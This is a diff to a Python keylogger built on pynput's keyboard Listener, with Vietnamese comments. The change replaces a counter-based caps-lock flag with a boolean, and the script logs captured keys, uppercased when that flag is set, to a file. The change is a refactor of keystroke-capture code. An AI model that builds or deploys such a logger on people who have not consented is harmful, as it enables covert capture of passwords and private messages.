@@ -1,8 +1,8 @@
 from pynput.keyboard import Listener
 import os
 
-# * Khởi tạo biến capslock
-capslock = 0
+# * Khởi tạo biến capslockIsOn
+capslockIsOn = False
 
 def anonymous(key):
     # * Dữ liệu nhập vào
@@ -13,11 +13,8 @@ def anonymous(key):
     if key == "Key.f12":
         raise SystemExit(0)
     
-    # * Khai báo capslock là biến toàn cục
-    global capslock
-    # * Nếu capslock = 2 đặt capslock về bằng 0 (xem dòng 60, 61)
-    if capslock == 2:
-        capslock = 0
+    # * Khai báo capslockIsOn là biến toàn cục
+    global capslockIsOn
     
     # * Bàn phím bên trái:
     if key == "Key.esc":
@@ -61,9 +58,12 @@ def anonymous(key):
     if key == "Key.tab":
         key = " tab\n "
     
-    # * Khi nhấn caps_lock thì sẽ tăng giá trị biến capslock
+    # * Khi nhấn caps_lock thì sẽ thay đổi giá trị biến capslockIsOn
     if key == "Key.caps_lock":
-        capslock = capslock + 1
+        if capslockIsOn == False:
+            capslockIsOn = True
+        else:
+            capslockIsOn = False
         key = ""
     
     if key == "Key.enter":
@@ -119,8 +119,8 @@ def anonymous(key):
     if key == "Key.num_lock":
         key = ""
 
-    # * Hàm chuyển đổi khi capslock đang bật
-    if capslock == 1:
+    # * Hàm chuyển đổi khi capslockIsOn == True
+    if capslockIsOn == True:
         key = key.upper()
 
     # * Chỉnh sửa phần này thành file muốn in ra
